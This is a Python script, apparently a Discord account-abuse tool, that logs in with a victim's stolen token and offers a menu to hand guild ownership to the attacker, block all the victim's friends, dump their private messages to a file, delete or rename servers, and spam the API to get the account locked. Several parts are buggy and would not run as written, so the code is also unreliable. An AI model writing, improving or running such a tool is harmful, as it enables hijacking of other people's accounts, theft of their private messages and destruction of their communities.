import os
import discord
from discord.ext import commands
import requests 
import json
import time
import threading

token = ""
attacker_id = ""

def change_theme_backend(theme, token):
    headers = {
        "user-agent": "Mozzilla/5.0 (Windows NT 1.0;) Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/737.36",
        "authorization": token
    }
    json = {
        "theme": theme
    }
    for _ in range(5):
        requests.get("https://discord.com/api/v8/users/@me/settings", headers=headers, json=json)

def lock_account_backend(token, id):
    headers = {
        "user-agent": "Mozzilla/5.0 (Windows NT 1.0;) Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/737.36",
        "authorization": token
    }
    for _ in range(5):
        requests.get("https://discord.com/api/v8/guilds/" + id + "/members", headers=headers)


def print_banner():
    banner = """
███████ ███████ ██████  ██    ██ ███████ ██████  ███████ ██    ██  ██████ ██   ██ ███████ ██████  
██      ██      ██   ██ ██    ██ ██      ██   ██ ██      ██    ██ ██      ██  ██  ██      ██   ██ 
███████ █████   ██████  ██    ██ █████   ██████  █████   ██    ██ ██      █████   █████   ██████  
     ██ ██      ██   ██  ██  ██  ██      ██   ██ ██      ██    ██ ██      ██  ██  ██      ██   ██ 
███████ ███████ ██   ██   ████   ███████ ██   ██ ██       ██████   ██████ ██   ██ ███████ ██   ██ 
                                                                                                  
                                        Local Version 1.0                                                                     
"""
    print(banner)

func_list = """
1: Get owner (gives you owner permission)
2: Block all friends
3: Dump all dms
4: Delete guild
5: Lock account
6: Change server name
7: Change theme
"""

prefix = "!!"
message = discord.Message 
bot = commands.Bot(command_prefix=prefix, self_bot=True)

@bot.event
async def on_ready():
    print_banner()
    print(func_list)
    choice = input(">>>")
    if choice == "1":
        id = input("Enter guild id: ")
        guild = await bot.fetch_guild(id)
        user = await bot.fetch_user(attacker_id) # your id
        await guild.edit(owner=user)
        print("Got owner! :D")
        time.sleep(2)
        await on_ready()
    if choice == "2":
        for friend in bot.user.friends:
            friend.block()
        print("Done")
        time.sleep(2)
        await on_ready()
    if choice == "3":
        for ch in bot.private_channels:
            messages = await ch.history(limit=200).flatten()
            for message in messages:
                with open("dms.txt", "a", encoding='utf-8-sig') as dmfile:
                    to_write = str(message.channel) + "> " + str(message.content) + " " + str(messages.author.name) + "\n"
                    dmfile.write(to_write)
        print("DMS written to: dms.txt")
        time.sleep(2)
        await on_ready()
    if choice == "4":
        guildid = input("Enter target guild: ")
        guild = await bot.fetch_guild(guildid)
        try:
            await guild.delete()
        except:
            print("Not enough permissions")
    if choice == "5":
        guildid = input("Enter a random guild id: ")
        banthread = threading.Thread(target=lock_account_backend, args=[token, guildid])
        banthread.start()
        print("Done")
        time.sleep(2)
        await on_ready()
    if choice == "6":
        guildid = input("Enter a target guild id: ")
        guild = await bot.fetch_guild(guildid)
        name = input("Enter new name: ")
        await guild.edit(name=name)
        print("Done")
        time.sleep(2)
        await on_ready()
    if choice == "7":
        theme = input("enter theme (only light or dark): ")
        if not theme == "light" or "dark":
            print("Unknown theme...")
            time.sleep(2)
            await on_ready()
        else:
            change_theme_backend(theme, token)

def setup():
    print_banner()
    token = input("Enter Target token: ")
    attacker_id = input("Enter your ID: ")
    bot.run(token, bot=False)

setup()
